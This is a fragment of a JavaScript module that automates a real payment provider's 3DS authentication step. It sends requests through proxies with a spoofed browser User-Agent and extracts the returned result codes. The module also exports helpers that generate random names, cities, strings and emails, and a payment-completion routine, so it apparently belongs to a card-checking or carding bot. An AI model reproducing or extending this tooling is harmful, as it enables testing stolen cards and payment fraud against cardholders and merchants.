        const threedsRedirect = await Request('https://5j.velocity.cellpointmobile.net/mpi/cybersource/threed-redirect', {
            // followlocation: true, // ← REMOVED - we need the Location header from 302 response
            proxy: proxy,
            postfields: `TransactionId=${TransactionId}&Response=&MD=null`,
            httpheader: [
                "Content-Type: application/x-www-form-urlencoded",
                `User-Agent: ${browserUA}`,
            ]
        });

        // ========================================
        // DEBUG: Log full response
        // ========================================
        // console.log('[DEBUG] ========================================');
        // console.log('[DEBUG] 3DS Redirect Full Response:');
        // console.log('[DEBUG] HTTP Code:', threedsRedirect.http_code);
        // console.log('[DEBUG] Response Body Length:', threedsRedirect.response?.length || 0);
        // console.log('[DEBUG] Response Body (first 500 chars):', threedsRedirect.response?.substring(0, 500));
        // console.log('[DEBUG] Headers Object:', JSON.stringify(threedsRedirect.headers, null, 2));
        // console.log('[DEBUG] Headers Keys:', Object.keys(threedsRedirect.headers || {}));
        // console.log('[DEBUG] ========================================');

        // ========================================
        // EXTRACT LOCATION HEADER (MULTI-METHOD)
        // ========================================
        // A 303 redirect returns an empty body — the destination is in the Location header.
        // Only bail out if the entire request object is null (connection/proxy failure).
        if (!threedsRedirect) {
            console.error('[3DS] 3DS redirect request failed (null response)');
            return { error: '3DS redirect request failed', response: null };
        }

        let location = null;

        // Method 1: Check parsed headers object (lowercase keys)
        if (threedsRedirect.headers && threedsRedirect.headers.location) {
            location = threedsRedirect.headers.location;
            console.log('[DEBUG] Location found in headers.location');
        }

        // Method 2: Check response_header (alternative key)
        if (!location && threedsRedirect.response_header && threedsRedirect.response_header.location) {
            location = threedsRedirect.response_header.location;
            console.log('[DEBUG] Location found in response_header.location');
        }

        // Method 3: Search in response body for redirect URL pattern
        if (!location && threedsRedirect.response) {
            const urlMatch = threedsRedirect.response.match(/(?:location|Location):\s*([^\r\n]+)/i);
            if (urlMatch && urlMatch[1]) {
                location = urlMatch[1].trim();
                console.log('[DEBUG] Location found in response body via regex');
            }
        }

        // Method 4: Check if URL params are already in response body
        if (!location && threedsRedirect.response) {
            const paramMatch = threedsRedirect.response.match(/[?&]code=([^&\s]+).*?sub_code=([^&\s]+)/);
            if (paramMatch) {
                location = threedsRedirect.response; // Use full response as "location"
                console.log('[DEBUG] URL params found directly in response body');
            }
        }

        if (!location) {
            console.error('[ERROR] No Location header found in 3DS redirect response');
            console.error('[ERROR] Full response object:', JSON.stringify(threedsRedirect, null, 2));
            return { 
                error: 'Missing Location header', 
                http_code: threedsRedirect.http_code,
                response: threedsRedirect.response,
                headers: threedsRedirect.headers
            };
        }

        console.log('[DEBUG] Final extracted location:', location);

        // ========================================
        // EXTRACT CODE AND SUB_CODE FROM LOCATION
        // ========================================
        const query = new URLSearchParams(location.split('?')[1] || location);
        const code = query.get('code');
        const sub_code = query.get('sub_code');

        console.log('[DEBUG] Extracted code:', code);
        console.log('[DEBUG] Extracted sub_code:', sub_code);

        if (!code) {
            console.error('[ERROR] Failed to extract code from location');
            console.error('[ERROR] Location string:', location);
            return {
                error: 'Failed to extract code from location',
                location: location,
                response: threedsRedirect.response
            };
        }

        // ========================================
        // RETURN SUCCESS RESULT
        // ========================================
        emitProgress(80, '3DS authentication complete');
        return { 
            code, 
            sub_code: sub_code ? sub_code.replace(/_/g, '') : sub_code, 
            location,
            response: threedsRedirect.response
        };

    } catch (error) {
        console.error('[3DS] Exception during 3DS handling:', error);
        console.error('[3DS] Stack:', error.stack);
        return { error: error.message, originalResponse: j };
    }
}
module.exports = {
    log,
    extract,
    build_query,
    session_to_json,
    addslashes,
    names,
    randomString,
    randomCity,
    Request,
    errorMessage,
    handle3DS,
    // completePayment,
    completePayment1,
    generateEmail,
    runWithAbortSignal
}
